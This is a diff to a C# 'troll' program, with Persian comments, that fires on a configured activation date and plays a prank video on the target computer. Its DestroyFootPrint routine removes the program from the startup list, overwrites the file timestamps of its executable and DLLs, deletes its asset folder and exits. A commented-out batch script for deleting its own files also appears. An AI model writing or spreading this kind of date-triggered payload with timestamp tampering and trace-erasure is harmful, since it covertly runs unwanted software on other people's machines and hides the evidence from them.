@@ -5,6 +5,7 @@ using System.IO;
 using BoneFier.Basic;
 using ReflectionClassOverriding;
 using BoneFier;
+using System.Reflection;
 
 namespace Script
 {
@@ -15,9 +16,11 @@ namespace Script
     {
         static AppConfig config;
         static bool TrollsActivated = false;
-        public static string VideoPath = @"C:\Users\msi PC\Desktop\Cristiano_Ronaldo_yells_siuuu_1,048,576_times_em5rwYX8DVY.mp4";
-
-
+        static bool DebugMode = false;
+        
+        public static string VideoName = "TROLLshowvid.wmv";
+        public static string VideoPath = Program.asset.AssetDirectory + VideoName;
+        
         void Start()
         {
 
@@ -26,61 +29,123 @@ namespace Script
         {
             config = Program.application.ApplicationConfig;
 
-            if(!TrollsActivated)
-            if (Calendarmanager.CheckActivationDate(config.Activationdate.ToDateTime()))
+            if (!TrollsActivated)
             {
-                if (!config.Enable)
-                {
-                    Debuger.PrintWarning("The program is disabled.");
-                    DestroyFootPrint();
-                    return;
-                }
+                RunTimeLoop.LoopActivationState = false;
 
-                Debuger.Print("Trolls Activated");
-                TrollsActivated = true;
-                //ترول فعال میشود
-                //MultipleErros(3);
-                PlayVideo();
-                //Console.Beep(1500, 2000);
+                if (Calendarmanager.CheckActivationDate(config.Activationdate.ToDateTime()))
+                {
+                    if (!config.Enable)
+                    {
+                        Debuger.PrintWarning("The program is disabled.");
+                        DestroyFootPrint();
+                        return;
+                    }
+
+                    Debuger.Print("Trolls Activated");
+                    TrollsActivated = true;
+                    //ترول فعال میشود
+
+                    //MultipleErros(3);
+                    PlayVideo();
+                }
             }
 
         }
 
         static void MultipleErros(int count)
         {
+
         }
-        [STAThread]
         static void PlayVideo()
         {
-            Trollplayer videoplayer = new Trollplayer();
+            //برای فعال سازی ویدیو پلیر به دو فایل دی ال ال نیاز است:
+            //AxInterop.WMPLib.dll
+            //Interop.WMPLib.dll
+
+            //windows xp error song
             //siuuu = https://www.youtube.com/watch?v=em5rwYX8DVY
             //Man yek hackeram = https://www.youtube.com/shorts/1X9uIWQgHR4
+            //Sedasima hack khabarnegar reaction
+            //Watch dogs 2 hack trailer
+            //Watch dogs 2 hack world
+            //Aqa "SAKET!"
+            //Bache biyapaen
+            //
 
+            Debuger.Print("Playing video.");
 
-
-            System.Windows.Forms.Application.Run(videoplayer);
-
+            try
+            {
+                Trollplayer videoplayer = new Trollplayer();
+                videoplayer.OnVideoEnded += OnVideoEnded;
+                System.Windows.Forms.Application.Run(videoplayer);
+            }
+            catch (Exception ex)
+            {
+                Debuger.LogError("Could not run Trollmedia.exception: " + ex.Message);
+            }
         }
+
+        static void OnVideoEnded()
+        {
+            if(!DebugMode)
+                DestroyFootPrint();
+        }
+
         static void DestroyFootPrint() // تابع پاک کردن رد پا
         {
             Debuger.Print("Destroying foot prints.");
 
-            kernel.RemoveStartUp(Program.emigrator.ApplicationName); //حذف کردن برنامه از لیست برنامه های استارت اپ
+            try
+            {
+                Kernel.RemoveStartUp(Program.emigrator.ApplicationName); //حذف کردن برنامه از لیست برنامه های استارت اپ
 
-            //ساخت فایل بت برای حذف فایل ها و برنامه
-            /*BATCH code for deleting files:
-                 timeout 1
-                 del "BoneFierApp.exe"
-                 @RD /S /Q "BFasset"    
-                 del "FootCleanerBATCH.bat"
-             */
+                //ساخت فایل بت برای حذف فایل ها و برنامه
+                /*BATCH code for deleting files:
+                     timeout 1
+                     @RD /S /Q "BFasset"
+                     del AxInterop.WMPLib.dll
+                     del BoneFierApp.exe
+                     del Interop.WMPLib.dll
+                     del FootCleanerBATCH.bat
+                 */
 
-            string BATscript = "timeout 1\ndel \"BoneFierApp.exe\"\n@RD /S /Q \"BFasset\"\ndel \"FootprintCleaner.bat\"";
+                //string BATscript = "timeout 1\n@RD /S /Q \"BFasset\"\ndel AxInterop.WMPLib.dll\ndel BoneFierApp.exe\ndel Interop.WMPLib.dll\ndel FootprintCleaner.bat";
 
-            File.WriteAllText(Program.emigrator.EmigrationPath + @"\FootprintCleaner.bat", BATscript);
-            Process.Start(@"FootprintCleaner.bat");
+                //string BatPath = Program.emigrator.EmigrationPath + @"FootprintCleaner.bat";
+                //File.WriteAllText(BatPath, BATscript);
 
-            Application.Exit(); //Good bye world.
+                //Process.Start(BatPath);
+
+                string app = Program.emigrator.EmigrationPath + Program.emigrator.ApplicationName + ".exe";
+
+                DateTime time = DateTime.Now;
+
+                File.SetCreationTime(app, time);
+                File.SetLastWriteTime(app, time);
+                File.SetLastAccessTime(app, time);
+
+                string dll1 = Program.emigrator.EmigrationPath + @"\AxInterop.WMPLib.dll";
+                string dll2 = Program.emigrator.EmigrationPath + @"\Interop.WMPLib.dll";
+
+                File.SetCreationTime(dll1, time);
+                File.SetLastWriteTime(dll1, time);
+                File.SetLastAccessTime(dll1, time);
+
+                File.SetCreationTime(dll2, time);
+                File.SetLastWriteTime(dll2, time);
+                File.SetLastAccessTime(dll2, time);
+
+
+                Directory.Delete(Program.asset.AssetDirectory,true);
+
+                Application.Exit(); //Good bye world.
+            }
+            catch (Exception ex)
+            {
+                Debuger.PrintError($"Failed to destroying foot prints. exception: {ex.Message}");
+            }
         }
     }
 }
